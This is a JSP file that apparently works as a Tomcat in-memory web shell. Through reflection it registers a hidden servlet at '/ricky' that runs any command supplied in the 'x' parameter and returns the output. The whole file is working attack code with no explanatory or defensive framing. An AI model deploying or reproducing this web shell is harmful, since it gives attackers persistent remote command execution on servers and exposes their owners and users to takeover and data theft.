<%@ page import="java.lang.reflect.Field" %>
<%@ page import="org.apache.catalina.core.ApplicationContext" %>
<%@ page import="org.apache.catalina.core.StandardContext" %>
<%@ page import="java.io.IOException" %>
<%@ page import="java.io.BufferedReader" %>
<%@ page import="java.io.InputStreamReader" %>
<%@ page import="org.apache.catalina.Wrapper" %>
<%
final String urlPattern = "/ricky";
final String servletName = "ricky";

try {
    ServletContext servletContext = request.getSession().getServletContext();
    if (servletContext.getFilterRegistration(servletName) == null) {
        Field servletfield = servletContext.getClass().getDeclaredField("context");
        servletfield.setAccessible(true);
        ApplicationContext applicationContext = (ApplicationContext) servletfield.get(servletContext);
        Field contextfield = applicationContext.getClass().getDeclaredField("context");
        contextfield.setAccessible(true);
        StandardContext standardContext = (StandardContext) contextfield.get(applicationContext);

        Servlet servlet = new Servlet() {
            @Override
            public void init(ServletConfig servletConfig) throws ServletException {

            }

            @Override
            public ServletConfig getServletConfig() {
                return null;
            }

            @Override
            public void service(ServletRequest servletRequest, ServletResponse servletResponse) throws ServletException, IOException {
                if(servletRequest.getParameter("x") != null){
                    Process process = Runtime.getRuntime().exec(servletRequest.getParameter("x"));
                    BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
                    String str = "";
                    String line;
                    while((line = reader.readLine()) != null) {
                        str += line;
                    }
                    servletResponse.getOutputStream().write(str.getBytes());
                    servletResponse.getOutputStream().flush();
                    servletResponse.getOutputStream().close();
                }
            }

            @Override
            public String getServletInfo() {
                return null;
            }

            @Override
            public void destroy() {

            }
        };

        Wrapper wrapper = standardContext.createWrapper();
        wrapper.setLoadOnStartup(1);
        wrapper.setName(servletName);
        wrapper.setServlet(servlet);
        wrapper.setServletClass(servlet.getClass().getName());

        standardContext.addChild(wrapper);
        standardContext.addServletMapping(urlPattern, servletName);
        out.print("tomcat servlet added");
    }
}catch (Exception e){
    e.printStackTrace();
}
%>
